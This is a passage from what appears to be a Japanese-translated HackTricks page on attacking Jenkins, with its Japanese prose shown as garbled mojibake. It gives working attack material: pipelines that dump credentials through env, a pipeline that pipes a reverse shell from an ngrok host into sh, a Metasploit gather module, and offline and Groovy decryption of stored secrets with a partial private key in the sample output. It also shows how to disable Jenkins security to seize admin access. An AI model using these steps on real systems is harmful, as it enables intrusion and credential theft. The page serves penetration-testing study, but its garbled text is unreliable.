ã‚‚ã†ä¸€ã¤ã®å•é¡Œã¨ã—ã¦ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®**ç’°å¢ƒå†…ã«ç§˜å¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹**ãŸã‚ã«ã¯ã€**ç§˜å¯†æƒ…å ±ã®åå‰ã¨ã‚¿ã‚¤ãƒ—ã‚’çŸ¥ã£ã¦ã„ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€**`usernamePassword`** **secret**ã‚’**`string`** **secret**ã¨ã—ã¦**ãƒ­ãƒ¼ãƒ‰**ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ãª**ã‚¨ãƒ©ãƒ¼**ãŒç™ºç”Ÿã—ã¾ã™ï¼š
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Here you have the way to load some common secret types:
ã„ãã¤ã‹ã®ä¸€èˆ¬çš„ãªã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚¿ã‚¤ãƒ—ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
ã“ã®ãƒšãƒ¼ã‚¸ã®æœ€å¾Œã«**ã™ã¹ã¦ã®èªè¨¼æƒ…å ±ã®ç¨®é¡**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**ã™ã¹ã¦ã®ç§˜å¯†æƒ…å ±ã‚’ä¸€åº¦ã«ãƒ€ãƒ³ãƒ—ã™ã‚‹**æœ€è‰¯ã®æ–¹æ³•ã¯ã€**Jenkins**ãƒã‚·ãƒ³ã‚’**ä¾µå®³**ã—ï¼ˆä¾‹ãˆã°ã€**built-in node**ã§ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ï¼‰ã€ãã®å¾Œ**ãƒã‚¹ã‚¿ãƒ¼ã‚­ãƒ¼**ã¨**æš—å·åŒ–ã•ã‚ŒãŸç§˜å¯†æƒ…å ±**ã‚’**æ¼æ´©**ã•ã›ã€ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§å¾©å·ã™ã‚‹ã“ã¨ã§ã™ã€‚\
ã“ã‚Œã‚’è¡Œã†æ–¹æ³•ã®è©³ç´°ã¯ã€[Nodes & Agentsã‚»ã‚¯ã‚·ãƒ§ãƒ³](./#nodes-and-agents)ãŠã‚ˆã³[Post Exploitationã‚»ã‚¯ã‚·ãƒ§ãƒ³](./#post-exploitation)ã«ã‚ã‚Šã¾ã™ã€‚
{% endhint %}

### ãƒˆãƒªã‚¬ãƒ¼

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ã‚ˆã‚Š: `triggers`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯ã€**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ãŒå†ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹è‡ªå‹•åŒ–ã•ã‚ŒãŸæ–¹æ³•**ã‚’å®šç¾©ã—ã¾ã™ã€‚GitHubã‚„BitBucketãªã©ã®ã‚½ãƒ¼ã‚¹ã¨çµ±åˆã•ã‚ŒãŸãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®å ´åˆã€`triggers`ã¯å¿…è¦ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€webhooksãƒ™ãƒ¼ã‚¹ã®çµ±åˆãŒã™ã§ã«å­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã‹ã‚‰ã§ã™ã€‚ç¾åœ¨åˆ©ç”¨å¯èƒ½ãªãƒˆãƒªã‚¬ãƒ¼ã¯`cron`ã€`pollSCM`ã€ãŠã‚ˆã³`upstream`ã§ã™ã€‚

Cronã®ä¾‹:
```bash
triggers { cron('H */4 * * 1-5') }
```
**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®ä»–ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„**ã€‚

### Nodes & Agents

**Jenkinsã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹**ã¯**ç•°ãªã‚‹ãƒã‚·ãƒ³ã§ç•°ãªã‚‹ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**å ´åˆãŒã‚ã‚Šã¾ã™ã€‚æ”»æ’ƒè€…ã®è¦–ç‚¹ã‹ã‚‰è¦‹ã‚‹ã¨ã€ç•°ãªã‚‹ãƒã‚·ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ã€**ç›—ã‚€ã¹ãç•°ãªã‚‹æ½œåœ¨çš„ãªã‚¯ãƒ©ã‚¦ãƒ‰èªè¨¼æƒ…å ±**ã‚„ã€ä»–ã®ãƒã‚·ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®**ç•°ãªã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ã‚¯ã‚»ã‚¹**ã‚’æ„å‘³ã—ã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€åŸºæœ¬æƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

**è¨­å®šã•ã‚ŒãŸãƒãƒ¼ãƒ‰**ã‚’`/computer/`ã§åˆ—æŒ™ã§ãã¾ã™ã€‚é€šå¸¸ã€\*\*`Built-In Node` \*\*ï¼ˆJenkinsã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ãƒãƒ¼ãƒ‰ï¼‰ã¨ã€å ´åˆã«ã‚ˆã£ã¦ã¯ã•ã‚‰ã«å¤šãã®ãƒãƒ¼ãƒ‰ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š

![](<../../.gitbook/assets/image (249).png>)

**Built-Inãƒãƒ¼ãƒ‰ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ã¯ç‰¹ã«èˆˆå‘³æ·±ã„**ã§ã™ã€‚ãªãœãªã‚‰ã€ãã‚Œã¯æ©Ÿå¯†ã®Jenkinsæƒ…å ±ã‚’å«ã‚“ã§ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚

**ãƒ“ãƒ«ãƒˆã‚¤ãƒ³Jenkinsãƒãƒ¼ãƒ‰**ã§**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’å®Ÿè¡Œ**ã—ãŸã„ã“ã¨ã‚’ç¤ºã™ã«ã¯ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³å†…ã«æ¬¡ã®è¨­å®šã‚’æŒ‡å®šã§ãã¾ã™ï¼š
```bash
pipeline {
agent {label 'built-in'}
```
### å®Œå…¨ãªä¾‹

ç‰¹å®šã®ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã§ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã€cronãƒˆãƒªã‚¬ãƒ¼ä»˜ãã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ãŠã‚ˆã³ã‚¹ãƒ†ãƒ¼ã‚¸ã®ç’°å¢ƒå¤‰æ•°ã€ã‚¹ãƒ†ãƒƒãƒ—ã§2ã¤ã®å¤‰æ•°ã‚’èª­ã¿è¾¼ã¿ã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’é€ä¿¡:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

`/credentials/` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ååˆ†ãªæ¨©é™ãŒã‚ã‚Œã°ã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ä¸€è¦§è¡¨ç¤ºã§ãã¾ã™ã€‚ã“ã‚Œã¯ `credentials.xml` ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ã¿ã‚’ä¸€è¦§è¡¨ç¤ºã—ã¾ã™ãŒã€**ãƒ“ãƒ«ãƒ‰æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«**ã«ã‚‚**ã•ã‚‰ã«å¤šãã®è³‡æ ¼æƒ…å ±**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

å„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®**æ§‹æˆã‚’ç¢ºèªã§ãã‚‹å ´åˆ**ã€ãƒªãƒã‚¸ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹**è³‡æ ¼æƒ…å ±ï¼ˆã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆï¼‰ã®åå‰**ã‚„**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä»–ã®è³‡æ ¼æƒ…å ±**ã‚‚ç¢ºèªã§ãã¾ã™ã€‚

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯**Jenkinsã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã«å¿…è¦**ã§ã™ï¼š

* secrets/master.key
* secrets/hudson.util.Secret

ã“ã®ã‚ˆã†ãª**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¯é€šå¸¸æ¬¡ã®å ´æ‰€ã«ã‚ã‚Šã¾ã™**ï¼š

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ã“ã‚Œã‚‰ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã®æ­£è¦è¡¨ç¾ã¯æ¬¡ã®é€šã‚Šã§ã™ï¼š
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkinsã®ç§˜å¯†æƒ…å ±ã‚’ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§å¾©å·åŒ–ã™ã‚‹

**ç§˜å¯†æƒ…å ±ã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã«å¿…è¦ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ€ãƒ³ãƒ—ã—ãŸå ´åˆ**ã€[**ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚‰ã®ç§˜å¯†æƒ…å ±ã‚’å¾©å·åŒ–ã—ã¾ã™**ã€‚
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovyã‹ã‚‰Jenkinsã®ç§˜å¯†ã‚’å¾©å·åŒ–ã™ã‚‹

```groovy
// Load the Jenkins instance
def jenkins = jenkins.model.Jenkins.instance

// Get the credentials store
def store = jenkins.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

// Decrypt the secrets
store.getCredentials(store.getDomains()[0]).each { cred ->
    println(cred.id + ": " + cred.secret.plainText)
}
```

ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯Jenkinsã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‹ã‚‰ç§˜å¯†ã‚’å¾©å·åŒ–ã—ã¾ã™ã€‚
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### æ–°ã—ã„ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ

1. Jenkinsã®config.xmlãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚ãƒ‘ã‚¹ã¯ `/var/lib/jenkins/config.xml` ã¾ãŸã¯ `C:\Program Files (x86)\Jenkins\` ã§ã™ã€‚
2. `<useSecurity>true</useSecurity>` ã¨ã„ã†å˜èªã‚’æ¤œç´¢ã—ã€**`true`** ã‚’ **`false`** ã«å¤‰æ›´ã—ã¾ã™ã€‚
   1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** ã‚µãƒ¼ãƒãƒ¼ã‚’å†èµ·å‹•ã—ã¾ã™: `service jenkins restart`
4. å†åº¦Jenkinsãƒãƒ¼ã‚¿ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»Šå›ã¯**JenkinsãŒèªè¨¼æƒ…å ±ã‚’è¦æ±‚ã—ã¾ã›ã‚“**ã€‚ã€Œ**Manage Jenkins**ã€ã«ç§»å‹•ã—ã¦ã€**ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å†è¨­å®š**ã—ã¾ã™ã€‚
5. è¨­å®šã‚’ `<useSecurity>true</useSecurity>` ã«å¤‰æ›´ã—ã¦**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å†åº¦æœ‰åŠ¹åŒ–**ã—ã€**Jenkinsã‚’å†èµ·å‹•**ã—ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
AWS Hackingã‚’å­¦ã³ã€ç·´ç¿’ã—ã¾ã—ã‚‡ã†:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingã‚’å­¦ã³ã€ç·´ç¿’ã—ã¾ã—ã‚‡ã†: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks) ãŠã‚ˆã³ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
